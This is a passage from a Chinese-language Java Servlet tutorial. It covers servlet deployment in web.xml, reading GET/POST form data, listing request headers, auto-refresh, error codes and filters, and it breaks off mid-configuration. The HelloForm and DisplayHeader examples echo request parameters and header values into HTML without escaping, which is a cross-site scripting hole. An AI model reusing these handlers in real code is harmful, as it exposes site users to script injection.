<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 导入必需的 java 库</span></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 扩展 HttpServlet 类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="comment">// 执行必需的初始化</span></span><br><span class="line">      message = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                    HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="comment">// 设置响应内容类型</span></span><br><span class="line">      response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 实际的逻辑是在这里</span></span><br><span class="line">      PrintWriter out = response.getWriter();</span><br><span class="line">      out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="comment">// 什么也不做</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3-Servlet部署"><a href="#3-Servlet部署" class="headerlink" title="3.Servlet部署"></a>3.Servlet部署</h2><p>打开WEB-INF目录下的web.xml，在<web-app>&lt;/web-app&gt;中添加以下内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">   <span class="comment">&lt;!--servlet标签给Tomcat配置Servlet程序--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--类名（必须与servlet-mapping中的servlet-name相同）--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloWorld<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--servlet-class是Servlet程序的全路径（全类名）--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>HelloWorld<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--servlet-mapping标签给servlet程序配置访问地址--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--servlet-name必须和servlet中的servlet-name相同--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloWorld<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--访问的网址--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/HelloWorld<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
<h1 id="Servlet表单数据"><a href="#Servlet表单数据" class="headerlink" title="Servlet表单数据"></a>Servlet表单数据</h1><h2 id="1-GET请求和POST请求"><a href="#1-GET请求和POST请求" class="headerlink" title="1.GET请求和POST请求"></a>1.GET请求和POST请求</h2><p>浏览器使用GET方法和POST方法让一些信息从浏览器到web服务器，最终走到后台程序。</p>
<h3 id="1-GET请求"><a href="#1-GET请求" class="headerlink" title="1.GET请求"></a>1.GET请求</h3><p><img src="https://s3.ax1x.com/2020/11/12/BzyiWt.jpg" alt="BzyiWt.jpg"></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>头信息</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Accept</td>
<td>告诉服务器，客户端可以接受的数据类型</td>
</tr>
<tr>
<td>Accept-Language</td>
<td>告诉服务器客户端可以接受的语言类型</td>
</tr>
<tr>
<td>User-Agent</td>
<td>浏览器信息</td>
</tr>
<tr>
<td>Accept-Encoding</td>
<td>告诉服务器，客户端可以接受的数据编码（压缩）格式</td>
</tr>
<tr>
<td>Host</td>
<td>表示请求的服务器ip和端口号</td>
</tr>
<tr>
<td>Connection</td>
<td>告诉服务器请求链接如何处置</td>
</tr>
</tbody>
</table>
</div>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://www.test.com/hello?key<span class="number">1</span>=value<span class="number">1</span>&amp;key<span class="number">2</span>=value<span class="number">2</span></span><br></pre></td></tr></table></figure>
<p><strong>GET请求将信息作为URL中的？字符后的字符串进行发送。</strong></p>
<p>GET请求是默认从浏览器向Web服务器传递信息的方法，这些信息使用QUERY_STRING头传递。Servlet使用doGet()方法处理这类请求。</p>
<h3 id="2-POST请求"><a href="#2-POST请求" class="headerlink" title="2.POST请求"></a>2.POST请求</h3><p>POST请求是把信息作为单独的消息，消息以标准输出的形式传到后台程序。Servlet使用doPost()方法处理这类请求。</p>
<h2 id="2-使用Servlet读取表单数据"><a href="#2-使用Servlet读取表单数据" class="headerlink" title="2.使用Servlet读取表单数据"></a>2.使用Servlet读取表单数据</h2><p>Servlet 处理表单数据，这些数据会根据不同的情况使用不同的方法自动解析：</p>
<ul>
<li><strong>getParameter()：</strong>您可以调用 request.getParameter() 方法来获取表单参数的值。</li>
<li><strong>getParameterValues()：</strong>如果参数出现一次以上，则调用该方法，并返回多个值，例如复选框。</li>
<li><strong>getParameterNames()：</strong>如果您想要得到当前请求中的所有参数的完整列表，则调用该方法</li>
</ul>
<h3 id="1-使用URL的Get方法实例"><a href="#1-使用URL的Get方法实例" class="headerlink" title="1.使用URL的Get方法实例"></a>1.使用URL的Get方法实例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Servlet implementation class HelloForm</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/HelloForm&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloForm</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">       </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#HttpServlet()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloForm</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 设置响应内容类型</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">          PrintWriter out = response.getWriter();</span><br><span class="line">        String title = <span class="string">&quot;使用 GET 方法读取表单数据&quot;</span>;</span><br><span class="line">        <span class="comment">// 处理中文</span></span><br><span class="line">        String name =<span class="keyword">new</span> String(request.getParameter(<span class="string">&quot;name&quot;</span>).getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>),<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        String docType = <span class="string">&quot;&lt;!DOCTYPE html&gt; \n&quot;</span>;</span><br><span class="line">        out.println(docType +</span><br><span class="line">            <span class="string">&quot;&lt;html&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&lt;head&gt;&lt;title&gt;&quot;</span> + title + <span class="string">&quot;&lt;/title&gt;&lt;/head&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&lt;body bgcolor=\&quot;#f0f0f0\&quot;&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&lt;h1 align=\&quot;center\&quot;&gt;&quot;</span> + title + <span class="string">&quot;&lt;/h1&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&lt;ul&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;  &lt;li&gt;&lt;b&gt;站点名&lt;/b&gt;：&quot;</span></span><br><span class="line">            + name + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;  &lt;li&gt;&lt;b&gt;网址&lt;/b&gt;：&quot;</span></span><br><span class="line">            + request.getParameter(<span class="string">&quot;url&quot;</span>) + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&lt;/ul&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理 POST 方法请求的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之后在web.xml中创建以下条目</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloForm<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>HelloForm<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloForm<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/TomcatTest/HelloForm<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="2-使用表单的POST方法实例"><a href="#2-使用表单的POST方法实例" class="headerlink" title="2.使用表单的POST方法实例"></a>2.使用表单的POST方法实例</h3><h1 id="Servlet客户端HTTP请求"><a href="#Servlet客户端HTTP请求" class="headerlink" title="Servlet客户端HTTP请求"></a>Servlet客户端HTTP请求</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.Enumeration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/DisplayHeader&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//扩展 HttpServlet 类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DisplayHeader</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理 GET 方法请求的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 设置响应内容类型</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        String title = <span class="string">&quot;HTTP Header 请求实例&quot;</span>;</span><br><span class="line">        String docType =</span><br><span class="line">                <span class="string">&quot;&lt;!DOCTYPE html&gt; \n&quot;</span>;</span><br><span class="line">        out.println(docType +</span><br><span class="line">                <span class="string">&quot;&lt;html&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;head&gt;&lt;meta charset=\&quot;utf-8\&quot;&gt;&lt;title&gt;&quot;</span> + title + <span class="string">&quot;&lt;/title&gt;&lt;/head&gt;\n&quot;</span>+</span><br><span class="line">                <span class="string">&quot;&lt;body bgcolor=\&quot;#f0f0f0\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;h1 align=\&quot;center\&quot;&gt;&quot;</span> + title + <span class="string">&quot;&lt;/h1&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;table width=\&quot;100%\&quot; border=\&quot;1\&quot; align=\&quot;center\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;tr bgcolor=\&quot;#949494\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;th&gt;Header 名称&lt;/th&gt;&lt;th&gt;Header 值&lt;/th&gt;\n&quot;</span>+</span><br><span class="line">                <span class="string">&quot;&lt;/tr&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Enumeration headerNames = request.getHeaderNames();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(headerNames.hasMoreElements()) &#123;</span><br><span class="line">            String paramName = (String)headerNames.nextElement();</span><br><span class="line">            out.print(<span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span> + paramName + <span class="string">&quot;&lt;/td&gt;\n&quot;</span>);</span><br><span class="line">            String paramValue = request.getHeader(paramName);</span><br><span class="line">            out.println(<span class="string">&quot;&lt;td&gt; &quot;</span> + paramValue + <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/table&gt;\n&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 处理 POST 方法请求的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>web.xml的配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span>  </span><br><span class="line">    <span class="comment">&lt;!-- 类名 --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DisplayHeader<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span>  </span><br><span class="line">    <span class="comment">&lt;!-- 所在的包 --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.myWeb3.DisplayHeader<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DisplayHeader<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span>  </span><br><span class="line">    <span class="comment">&lt;!-- 访问的网址 --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/myWeb3/DisplayHeader<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="Servlet服务器HTTP响应"><a href="#Servlet服务器HTTP响应" class="headerlink" title="Servlet服务器HTTP响应"></a>Servlet服务器HTTP响应</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//导入必需的 java 库</span></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/Refresh&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//扩展 HttpServlet 类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Refresh</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理 GET 方法请求的方法</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                        HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">                <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          <span class="comment">// 设置刷新自动加载时间为 5 秒</span></span><br><span class="line">          response.setIntHeader(<span class="string">&quot;Refresh&quot;</span>, <span class="number">5</span>);</span><br><span class="line">          <span class="comment">// 设置响应内容类型</span></span><br><span class="line">          response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">         </span><br><span class="line">          <span class="comment">//使用默认时区和语言环境获得一个日历  </span></span><br><span class="line">          Calendar cale = Calendar.getInstance();  </span><br><span class="line">          <span class="comment">//将Calendar类型转换成Date类型  </span></span><br><span class="line">          Date tasktime=cale.getTime();  </span><br><span class="line">          <span class="comment">//设置日期输出的格式  </span></span><br><span class="line">          SimpleDateFormat df=<span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);  </span><br><span class="line">          <span class="comment">//格式化输出  </span></span><br><span class="line">          String nowTime = df.format(tasktime);</span><br><span class="line">          PrintWriter out = response.getWriter();</span><br><span class="line">          String title = <span class="string">&quot;自动刷新 Header 设置&quot;</span>;</span><br><span class="line">          String docType =</span><br><span class="line">          <span class="string">&quot;&lt;!DOCTYPE html&gt;\n&quot;</span>;</span><br><span class="line">          out.println(docType +</span><br><span class="line">            <span class="string">&quot;&lt;html&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&lt;head&gt;&lt;title&gt;&quot;</span> + title + <span class="string">&quot;&lt;/title&gt;&lt;/head&gt;\n&quot;</span>+</span><br><span class="line">            <span class="string">&quot;&lt;body bgcolor=\&quot;#f0f0f0\&quot;&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&lt;h1 align=\&quot;center\&quot;&gt;&quot;</span> + title + <span class="string">&quot;&lt;/h1&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&lt;p&gt;当前时间是：&quot;</span> + nowTime + <span class="string">&quot;&lt;/p&gt;\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 处理 POST 方法请求的方法</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                         HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">          <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">         doGet(request, response);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">showError</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        response.sendError(<span class="number">407</span>,<span class="string">&quot;显示错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span><span class="keyword">throws</span> ServletException,IOException</span>&#123;</span><br><span class="line">        doGet(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="Servlet编写过滤器"><a href="#Servlet编写过滤器" class="headerlink" title="Servlet编写过滤器"></a>Servlet编写过滤器</h1><h2 id="1-什么是过滤器"><a href="#1-什么是过滤器" class="headerlink" title="1.什么是过滤器"></a>1.什么是过滤器</h2><p>实际上就是对web资源进行拦截，做一些处理后再交给下一个过滤器或servlet处理通常都是用来拦截request进行处理的，也可以对返回地response进行拦截处理。</p>
<p><img src="https://img-blog.csdn.net/20180730175152255?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1emhpcWlhbmdfMTk5Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""></p>
<h2 id="2-Servlet过滤器的方法"><a href="#2-Servlet过滤器的方法" class="headerlink" title="2.Servlet过滤器的方法"></a>2.Servlet过滤器的方法</h2><div class="table-container">
<table>
<thead>
<tr>
<th>序号</th>
<th>方法 &amp; 描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td><em>public void doFilter (ServletRequest, ServletResponse, FilterChain)</em> 该方法完成实际的过滤操作，当客户端请求方法与过滤器设置匹配的URL时，Servlet容器将先调用过滤器的doFilter方法。FilterChain用户访问后续过滤器。</td>
</tr>
<tr>
<td>2</td>
<td><em>public void init(FilterConfig filterConfig)</em>  web 应用程序<strong>启动时，web 服务器将创建Filter  的实例对象，并调用其init方法</strong>，读取web.xml配置，完成对象的初始化功能，从而为后续的用户请求作好拦截的准备工作（<strong>filter对象只会创建一次，init方法也只会执行一次</strong>）。开发人员通过init方法的参数，可获得代表当前filter配置信息的FilterConfig对象。</td>
</tr>
<tr>
<td>3</td>
<td><em>public void destroy()</em> Servlet容器在销毁过滤器实例<strong>前</strong>调用该方法，在该方法中释放Servlet过滤器占用的资源。</td>
</tr>
</tbody>
</table>
</div>
<p>idea中创建过滤器后的默认代码：CharsetFilter实现了Filter接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;CharsetFilter&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CharsetFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*初始化方法  接收一个FilterConfig类型的参数 该参数是对Filter的一些配置*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//获取的是web.xml中配置Filter时设置的值，参数为设置值的名称，若值不存在，则返回空</span></span><br><span class="line">         String initParam = config.getInitParameter(<span class="string">&quot;param&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*过滤方法 主要是对request和response进行一些处理，然后交给下一个过滤器或Servlet处理*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        chain.doFilter(req, resp);<span class="comment">//交给下一个过滤器或servlet处理</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*销毁时调用*/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>web.xml配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>类名<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>全类名<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span><span class="comment">&lt;!-- 设置在过滤器中执行初始化方法时，获取的值，如：param --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>param<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>studyFilter<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>类名<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 设置为访问该网站所有地址都需要通过该过滤器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span 